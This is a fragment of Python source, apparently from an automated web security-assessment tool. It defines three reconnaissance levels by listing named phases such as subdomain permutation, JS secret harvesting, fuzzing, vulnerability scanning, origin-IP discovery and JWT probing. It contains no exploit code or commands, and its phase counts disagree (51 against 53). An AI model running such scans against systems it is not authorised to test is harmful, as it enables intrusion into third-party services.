    ["46-BUCKET", "47-CDN", "48-CONTENT"],
]


_RECON_LEVELS = {
    "1": {
        "name": "Basic reconnaissance",
        "desc": "Scope → Subs → DNS → Ports/HTTP → URLs → Report (fast, no vuln scanning)",
        "phases": {"00-SCOPE", "01-RECON", "02-RESOLVE", "04-SCAN", "05-HARVEST"},
    },
    "2": {
        "name": "Standard assessment",
        "desc": "Basic + sub perms + JS secrets + params + fuzzing + nuclei + TLS + origin IP + JWT + cache + rate-limit + WebSocket",
        "phases": {"00-SCOPE", "01-RECON", "02-RESOLVE", "03-PERMUTE", "04-SCAN", "05-HARVEST", "06-JSINTEL", "07-PARAMS", "08-FUZZ", "09-VULNSCAN", "10-TLSCMS", "14-ORIGIN", "24-JWT", "28-CACHED", "34-RATELIMIT", "41-WEBSOCKET"},
    },
    "full": {
        "name": "Full audit",
        "desc": "All 51 phases — every recon + injection + auth + advanced probe + correlation + evidence",
        "phases": VALID_PHASES,
    },
}
# 53 phases in PIPELINE: 00-SCOPE through 48-CONTENT (including 04b, 05b, 11b, 16A, 16B, 17b)
